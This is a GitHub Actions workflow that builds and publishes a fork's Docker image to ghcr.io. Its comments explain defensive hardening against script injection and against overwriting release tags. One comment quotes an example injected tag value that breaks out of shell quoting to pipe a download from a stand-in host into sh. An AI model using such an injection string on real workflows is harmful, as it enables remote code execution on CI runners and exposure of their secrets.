name: MediaNest Bridge Release Image

# Fork-owned publish workflow for the medianest_bridge image (T5). This file
# is intentionally separate from upstream's own .github/workflows/ci.yaml
# and release.yaml, and neither of those files is modified by this change:
# a merge/rebase from upstream (meeb/tubesync) can never conflict on this
# file, and this file's fork-specific concerns (a distinct tag namespace,
# the MEDIANEST_BRIDGE_UPSTREAM_SHA build-arg) stay entirely on the fork
# side. See medianest_bridge/docs/upstream-sync.md for the fork's upstream
# sync process this file is designed to survive unmodified.
#
# GitHub Actions is enabled for this fork repository (KingInYellows/tubesync;
# the CI workflow runs on main). This file has been authored and validated
# with `actionlint` but, as of the bridge-v1.0.0 release package
# (2026-09-05), has never actually run -- no workflow_dispatch and no
# bridge-v* tag yet. The build-only proof is a workflow_dispatch with
# push=false; both it and the tag are repository-owner actions. Do not infer
# a successful run from this file's mere presence.
#
# Reuses this repo's own existing composite actions (.github/actions/*),
# unmodified, the same way upstream's own release.yaml does -- FFmpeg-Builds
# and yt-dlp/ejs release lookups are the same real external dependency this
# Dockerfile has always had; this workflow does not invent a new one.

env:
  IMAGE_NAME: tubesync
  REGISTRY: ghcr.io

on:
  push:
    tags:
      # A tag namespace distinct from upstream's own version tags (e.g.
      # `v0.18.3`), so a future `git fetch upstream && git merge` can never
      # produce a colliding tag with a fork release. Chosen, not inherited
      # from upstream -- see medianest_bridge/docs/upstream-sync.md.
      - 'bridge-v*'
  workflow_dispatch:
    inputs:
      tag:
        description: >-
          Image tag to build/publish (e.g. bridge-v1.0.0-t5). Required for a
          manual run since there is no tag ref to read one from.
        required: true
        type: string
      push:
        description: >-
          Push the built image to ghcr.io. Leave unchecked for a build-only
          dry run that still exercises the full build but publishes nothing.
        required: false
        type: boolean
        default: true

jobs:
  info:
    runs-on: ubuntu-latest
    outputs:
      IMAGE_NAME: ${{ env.IMAGE_NAME }}
      REGISTRY: ${{ env.REGISTRY }}
      tag: ${{ steps.tag.outputs.tag }}
      upstream-sha: ${{ steps.upstream-sha.outputs.sha }}
      lowercase-github-repository_owner: ${{ steps.owner.outputs.lowercase }}
      ffmpeg-date: ${{ steps.ffmpeg.outputs.date }}
      ffmpeg-version: ${{ steps.ffmpeg.outputs.version }}
      ytdlp-latest-release: ${{ steps.yt-dlp.outputs.latest-release }}
      ejs-latest-release: ${{ steps.ejs.outputs.latest-release }}
    steps:
      - uses: actions/checkout@v7

      - name: Resolve image tag
        id: tag
        shell: bash
        # `inputs.tag` is free-form, attacker-controlled text (anyone who can
        # dispatch this workflow chooses it) -- GitHub Actions substitutes
        # `${{ }}` expressions into the run script's SOURCE TEXT before bash
        # ever sees it, so interpolating it directly (the old `tag='${{
        # inputs.tag }}'`) let a value like `bridge-v1'; curl evil | sh #`
        # break out of the quoting and execute as this step's own shell
        # commands, before the namespace check below ever ran (classic GHA
        # script-injection; chatgpt-codex-connector review). Passing it
        # through `env:` instead means bash only ever sees it as inert
        # environment-variable *data*, never as script source.
        env:
          DISPATCH_TAG: ${{ inputs.tag }}
        run: |
          if [ "${{ github.event_name }}" = 'workflow_dispatch' ]; then
            tag="${DISPATCH_TAG}"
          else
            tag="${GITHUB_REF#refs/tags/}"
          fi
          test -n "${tag}" || { echo '::error::no image tag resolved'; exit 1; }
          # A `push` trigger is already restricted to `bridge-v*` by this
          # workflow's own `on.push.tags` filter above, but `workflow_dispatch`
          # takes an arbitrary free-text string -- enforce the same namespace
          # here so a manual run can never publish as `latest` or any other
          # tag outside the fork's release namespace (sourcery-ai review).
          case "${tag}" in
            (bridge-v*) : ;;
            (*) echo "::error::tag '${tag}' is not in the 'bridge-v*' namespace"; exit 1 ;;
          esac
          # Belt-and-suspenders on top of the env: fix above: this value
          # also flows into other steps' shell scripts downstream (as
          # `needs.info.outputs.tag`, itself now also passed through `env:`
          # rather than interpolated -- see those steps) and into
          # docker/build-push-action's `tags:`/build-args input. Restricting
          # it to a strict Docker-tag-safe character set here means no
          # shell metacharacter can ever reach any later consumer of this
          # output, regardless of how that consumer handles it.
          case "${tag}" in
            (*[!A-Za-z0-9._-]*) echo "::error::tag '${tag}' contains characters outside [A-Za-z0-9._-]"; exit 1 ;;
          esac
          printf -- 'tag=%s\n' "${tag}" >> "${GITHUB_OUTPUT}"

      - name: Read pinned upstream-base SHA
        id: upstream-sha
        shell: bash
        run: |
          # medianest_bridge/docs/UPSTREAM_SHA is the single canonical
          # source for this value (see that file and
          # medianest_bridge/README.md's "Compatibility reporting" section
          # -- bridge-openapi.v1.yaml's Meta.upstreamCommit is documented
          # as "Full git SHA of the upstream commit the fork tracks", the
          # fixed upstream base this fork branched from, NOT this image's
          # own build commit). Read here, not duplicated as a literal SHA
          # in this workflow file, so an upstream re-sync only has one
          # place to update.
          file='tubesync/medianest_bridge/docs/UPSTREAM_SHA'
          test -f "${file}" || { echo "::error::${file} not found"; exit 1; }
          sha="$(tr -d '[:space:]' < "${file}")"
          case "${sha}" in
            ([0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]) : ;;
            (*) echo "::error::${file} does not contain a 40-character lowercase hex SHA: [${sha}]"; exit 1 ;;
          esac
          printf -- 'sha=%s\n' "${sha}" >> "${GITHUB_OUTPUT}"

      - name: Lowercase github repository owner
        id: owner
        uses: ./.github/actions/string-case
        with:
          string: ${{ github.repository_owner }}

      - name: Retrieve yt-dlp/FFmpeg-Builds releases with GitHub CLI
        id: ffmpeg
        uses: ./.github/actions/FFmpeg

      - name: Retrieve yt-dlp/yt-dlp releases with GitHub CLI
        id: yt-dlp
        uses: ./.github/actions/yt-dlp

      - name: Retrieve yt-dlp/ejs releases with GitHub CLI
        id: ejs
        uses: ./.github/actions/yt-dlp
        with:
          repository_name: ejs

  build-and-publish:
    needs: ['info']
    runs-on: ubuntu-latest
    timeout-minutes: 60
    concurrency:
      group: ${{ github.repository }}-${{ github.workflow }}
      cancel-in-progress: false
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v7

      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v4

      - name: Log in to ${{ needs.info.outputs.REGISTRY }}
        if: ${{ github.event_name != 'workflow_dispatch' || inputs.push }}
        uses: docker/login-action@v3
        with:
          registry: ${{ needs.info.outputs.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Refuse to overwrite an existing release tag
        # Release tags must be immutable so the rollback procedure can rely
        # on a tag identifying fixed image contents -- rerunning this
        # workflow (push retrigger or a manual workflow_dispatch reusing an
        # old tag) must never silently republish over one (sourcery-ai
        # review). Only meaningful when this run will actually push.
        #
        # `docker buildx imagetools inspect` exits nonzero both when the
        # manifest genuinely doesn't exist AND on auth/network/registry
        # failures -- treating every nonzero exit as "tag is free" would
        # let a transient inspection failure silently clobber a real
        # immutable tag (chatgpt-codex-connector review). Only a response
        # that explicitly confirms the manifest is absent is treated as
        # "safe to publish"; anything else retries a few times and then
        # fails closed rather than guessing.
        if: ${{ github.event_name != 'workflow_dispatch' || inputs.push }}
        shell: bash
        # Same env:-not-interpolation hardening as "Resolve image tag" above:
        # even though TAG is already namespace- and character-restricted by
        # that step, this step's own script source never directly embeds a
        # `${{ }}` expression -- everything it needs arrives as inert
        # environment-variable data (chatgpt-codex-connector review).
        env:
          IMAGE_REF: ${{ needs.info.outputs.REGISTRY }}/${{ needs.info.outputs.lowercase-github-repository_owner }}/${{ needs.info.outputs.IMAGE_NAME }}:${{ needs.info.outputs.tag }}
          TAG: ${{ needs.info.outputs.tag }}
        run: |
          image="${IMAGE_REF}"
          attempt=1
          max_attempts=3
          while :; do
            # GitHub Actions runs `shell: bash` as `bash -eo pipefail`, so a
            # bare `output="$(cmd)"` assignment would abort the whole step
            # via errexit the instant the command fails -- which is every
            # single time this tag hasn't been published yet, defeating the
            # "not found is fine" case entirely. Making the assignment the
            # condition of `if` is the standard way to capture both output
            # and status without tripping -e (chatgpt-codex-connector review).
            if output="$(docker buildx imagetools inspect "${image}" 2>&1)"; then
              echo "::error::tag '${TAG}' already exists at ${image} -- release tags are immutable, publish under a new tag"
              exit 1
            fi
            case "${output}" in
              (*'not found'*|*'manifest unknown'*|*'MANIFEST_UNKNOWN'*|*'NAME_UNKNOWN'*|*'no such manifest'*|*'404'*)
                # A confirmed "manifest absent" response -- genuinely safe
                # to publish this tag for the first time.
                break
                ;;
            esac
            if [ "${attempt}" -ge "${max_attempts}" ]; then
              echo "::error::could not confirm tag '${TAG}' is absent from ${image} after ${max_attempts} attempts; inspection failed with an error other than 'manifest not found' (auth/network/registry issue), so refusing to publish rather than risk overwriting an existing immutable tag. Last error: ${output}"
              exit 1
            fi
            attempt=$((attempt + 1))
            sleep 5
          done

      - name: Build and publish
        uses: docker/build-push-action@v7
        with:
          platforms: linux/amd64,linux/arm64
          push: ${{ github.event_name != 'workflow_dispatch' || inputs.push }}
          tags: |
            ${{ needs.info.outputs.REGISTRY }}/${{ needs.info.outputs.lowercase-github-repository_owner }}/${{ needs.info.outputs.IMAGE_NAME }}:${{ needs.info.outputs.tag }}
          build-args: |
            IMAGE_NAME=${{ needs.info.outputs.IMAGE_NAME }}
            FFMPEG_DATE=${{ needs.info.outputs.ffmpeg-date }}
            FFMPEG_VERSION=${{ needs.info.outputs.ffmpeg-version }}
            YTDLP_DATE=${{ fromJSON(needs.info.outputs.ytdlp-latest-release).tag.name }}
            YTDLP_EJS_VERSION=${{ fromJSON(needs.info.outputs.ejs-latest-release).tag.name }}
            MEDIANEST_BRIDGE_UPSTREAM_SHA=${{ needs.info.outputs.upstream-sha }}
